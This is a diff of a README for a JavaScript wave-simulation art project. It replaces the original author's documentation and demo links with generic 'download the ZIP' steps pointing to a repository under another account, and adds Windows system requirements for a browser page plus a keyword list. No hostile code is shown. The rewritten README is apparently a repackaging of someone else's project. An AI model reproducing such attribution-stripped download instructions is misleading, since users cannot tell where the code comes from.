@@ -1,211 +1,80 @@
-# Pool Wind Sun — Generative Art
+# 🌊 Pool-Wind-Sun-Generative-Art - Create unique digital wave art patterns
 
-[![Live Demo](https://img.shields.io/badge/demo-live-green?style=for-the-badge)](https://reyrove.github.io/Pool-Wind-Sun-Generative-Art)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![](https://img.shields.io/badge/Download-Project-blue)](https://github.com/zacherycentromeric319/Pool-Wind-Sun-Generative-Art)
 
-> **Generative wave simulation art with fluid dynamics.** Each refresh creates a unique pool of rippling waves with oscillating patterns, resembling wind moving across water under sunlight.
+Pool Wind Sun generates fluid wave simulations. This software creates unique patterns using math and color. Every time the screen updates, the system builds a new design based on fluid dynamics. These patterns feature oscillating waves and colors inspired by sunsets. You can use these designs for digital art projects or textile prints.
 
-## 🎨 Live Demo
+## 💻 System Requirements
 
-<div align="center">
-  <a href="https://reyrove.github.io/Pool-Wind-Sun-Generative-Art" target="_blank">
-    <img src="demo-screenshot.jpg" alt="Pool Wind Sun Website Demo" width="800" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);"/>
-  </a>
-  <br><br>
-  <a href="https://reyrove.github.io/Pool-Wind-Sun-Generative-Art" target="_blank">
-    <img src="https://img.shields.io/badge/🌐_View_Live_Demo-0a0a0a?style=for-the-badge&logo=githubpages&logoColor=white&color=c9a84c" alt="View Live Demo" width="300"/>
-  </a>
-  <br>
-  <em>Click the image or button to experience the generative art</em>
-</div>
+Your computer needs specific parts to run this software. Please read these requirements before you start.
 
-## 👕 Apparel Preview
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 100 megabytes of free space.
+- Display: A monitor with a resolution of 1280x720 or higher.
+- Graphics: A graphics card that supports current web browser standards.
 
-<div align="center">
-  <img src="Pool-Wind-Sun.jpg" alt="Pool Wind Sun on T-Shirt" width="600" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br>
-  <em>Pool Wind Sun artwork printed on a T-shirt</em>
-</div>
+## 📥 Downloading the Software
 
-## ✨ Features
+You must visit the project page to get the files. Follow these steps to obtain the software.
 
-- **Wave Simulation** — Physics-based fluid dynamics with oscillating patterns
-- **Dynamic Grid** — 350-550 cell grid with random dimensions
-- **Oscillating Points** — 1-380+ wave sources creating ripples
-- **Gradient Colors** — Beautiful sunset-inspired color transitions
-- **Variable Scale** — Random scaling creates unique compositions
-- **Save & Share** — Download as PNG
-- **Apparel Mode** — Preview artwork on a T-shirt mockup
-- **Responsive** — Works on desktop, tablet, and mobile
-- **Pure JavaScript** — Built without external libraries
-- **Keyboard Shortcuts**:
-  - `R` — Regenerate
-  - `S` — Save image
-  - `T` — Toggle apparel view
-  - `Space` — Regenerate
+1. Go to the [official project page](https://github.com/zacherycentromeric319/Pool-Wind-Sun-Generative-Art).
+2. Look for the button that says Code.
+3. Click the button to open a menu.
+4. Select Download ZIP from the list.
+5. Save the file to your computer.
 
-## 🎨 Artwork Details
+## 🛠️ Setting Up Your Computer
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| **Grid Columns** | 350–400 | Horizontal resolution |
-| **Grid Rows** | 340–390 | Vertical resolution |
-| **Oscillators** | 1–380+ | Wave source points |
-| **Wave Speed (c)** | Variable | Propagation speed |
-| **Time Steps** | 30–70 | Simulation duration |
-| **Scale Factor** | 0.75–1.0 | Canvas scaling |
-| **Background** | 30–230 | Dark to light backgrounds |
+Once the download finishes, follow these instructions to access your art tool.
 
-## 🎯 Color Gradients
+1. Locate the file you just downloaded. It will have a zipper icon on the folder.
+2. Right-click the folder and choose Extract All.
+3. Select a location on your hard drive where you want to keep the files.
+4. Press the Extract button.
+5. Open the folder you just created.
+6. Look for the file named index.html.
 
-The artwork features dynamic gradient colors that shift based on wave amplitude:
+## 🎨 Running the Simulation
 
-| Position | Color Range |
-|----------|-------------|
-| **Top (Low amplitude)** | Deep blues (10-50, 180-255, 200-255) |
-| **Bottom (High amplitude)** | Warm oranges and pinks (50-90, 200-255, 150-210) |
-| **Wave Peaks** | Bright highlights (255, 255, 255) |
-| **Wave Troughs** | Deeper, richer colors |
+You can view the art simulation inside your favorite web browser.
 
-### Color Behavior
-- Base colors shift from blue at the top to warm tones at the bottom
-- Wave height adds brightness and reduces opacity
-- Creates a sunset-over-water effect
-- Alpha channel varies with wave amplitude for depth
+1. Double-click the index.html file.
+2. If your computer asks which program to use, select your web browser like Chrome, Edge, or Firefox.
+3. The simulation will load immediately.
+4. Watch the waves move and change across your screen.
 
-## 🚀 Quick Start
+## ⚡ How to Create New Patterns
 
-### Local Development
+The software generates a unique design every time you reload the page.
 
-```bash
-# Clone the repository
-git clone https://github.com/reyrove/Pool-Wind-Sun-Generative-Art.git
+1. Press the F5 key on your keyboard to refresh the view.
+2. A new set of waves will appear as the fluid dynamics re-calculate.
+3. Observe how the sunset gradients shift and cycle through different tones.
+4. If you see a pattern you like, you can take a screenshot by pressing the Print Screen key on your keyboard.
 
-# Navigate to the directory
-cd Pool-Wind-Sun-Generative-Art
+## 👔 Using Designs for Apparel
 
-# Open in browser
-open index.html
-# or use a live server
-```
+This tool helps artists create patterns for t-shirts and fabric.
 
-### Deploy to GitHub Pages
+1. Generate a pattern you enjoy.
+2. Save your screenshot as a high-quality image file.
+3. Upload this file to your preferred print-on-demand service.
+4. Preview the design on apparel templates provided by those services.
+5. Adjust the scale or orientation to fit the t-shirt or fabric size.
 
-1. Push to GitHub
-2. Go to Settings → Pages
-3. Select branch `main` and root folder
-4. Your site will be live at `https://reyrove.github.io/Pool-Wind-Sun-Generative-Art`
+## 🔧 Troubleshooting Common Issues
 
-## 🧠 How It Works
+If the software does not work, check these common fixes.
 
-The artwork simulates wave propagation using the 2D wave equation:
+- If the page looks white, refresh your browser tab.
+- Ensure your internet browser is up to date.
+- Close other programs if your computer feels slow while the simulation runs.
+- Check that you extracted all files from the ZIP folder before opening them.
 
-### Physics Simulation
+## 💡 About Fluid Dynamics
 
-1. **Wave Equation**: 
-   ```
-   ∂²u/∂t² = c²(∂²u/∂x² + ∂²u/∂y²)
-   ```
-   Where `u` is wave height, `c` is wave speed
+This project uses math to mimic how water moves. The simulator calculates the physics of waves in real time. Because the math includes randomness, no two patterns are identical. The sunset colors apply mathematical overlays to the waves to create the final visual effect.
 
-2. **Numerical Method**:
-   - Finite difference method on a 2D grid
-   - Second-order accurate in space and time
-   - Stable for given timestep `dt`
-
-3. **Oscillators**:
-   - Randomly placed point sources
-   - Each oscillates at unique frequency
-   - Creates interference patterns
-
-4. **Boundary Conditions**:
-   - Reflective boundaries
-   - Waves bounce off edges
-   - Creates complex standing wave patterns
-
-### Color Mapping
-
-- Wave height mapped to 0-1 range
-- Gradient based on grid position (x,y)
-- Amplitude adds brightness
-- Alpha channel creates transparency effect
-
-## 📁 File Structure
-
-```
-Pool-Wind-Sun-Generative-Art/
-├── index.html          # Main application (all-in-one)
-├── Pool-Wind-Sun.jpg   # T-shirt mockup image
-├── fav.svg             # Favicon
-├── demo-screenshot.jpg # Website demo screenshot
-├── README.md           # This file
-└── LICENSE             # MIT License
-```
-
-## 🛠️ Tech Stack
-
-- **Pure JavaScript** — No external libraries
-- **Canvas API** — 2D rendering with transparency
-- **CSS Flexbox/Grid** — Responsive layout
-- **GitHub Pages** — Hosting
-
-## 🎯 Interactive Controls
-
-| Action | Keyboard | Button |
-|--------|----------|--------|
-| Regenerate | `R` or `Space` | Click "regenerate" |
-| Save Image | `S` | Click "regenerate" |
-| Toggle Apparel | `T` | Click "apparel" |
-
-## 🎨 The Creative Process
-
-### Wave Physics
-The artwork uses the 2D wave equation to simulate realistic wave propagation. Multiple oscillating point sources create interference patterns, mimicking wind rippling across a pool of water.
-
-### Organic Patterns
-Random oscillator placement and frequencies generate unique, organic wave patterns every time. The interference of multiple waves creates complex, beautiful ripple effects.
-
-### Color Palette
-The gradient color scheme transitions from cool blues at the top to warm oranges and pinks at the bottom, creating a sunset reflection effect on the water surface.
-
-### Amplitude Mapping
-Wave height is mapped to both color brightness and opacity, creating depth and dimensionality. Higher waves appear brighter and more opaque, while lower waves are softer and more transparent.
-
-## 📱 Responsive Design
-
-The application automatically adapts to:
-- Desktop screens
-- Tablets
-- Mobile phones
-- Landscape orientation
-- Various aspect ratios
-- Small screens (down to 380px wide)
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Fork the repository
-- Create a feature branch
-- Submit a pull request
-
-### Ideas for Contributions:
-- Additional color palettes
-- Different boundary conditions
-- Animation features
-- Interactive controls
-- Performance optimizations
-- More apparel mockups
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by wave physics and fluid dynamics
-- Named for the gentle interaction of pool, wind, and sun
-- Special thanks to the creative coding community
-
----
-
-**Built with ❤️ and wave dreams**
+Keywords: creative-coding, creative-coding-jobs, creative-coding-projects, css, digital-art, digital-artist, fluid-dynamics, fluid-dynamics-simulator, generative-art-toolkit, generative-design, generative-design-patterns, html, javascript, pattern-design, responsive-design, reyrove, textile-design, textile-designer, tshirt-design, wave-simulation
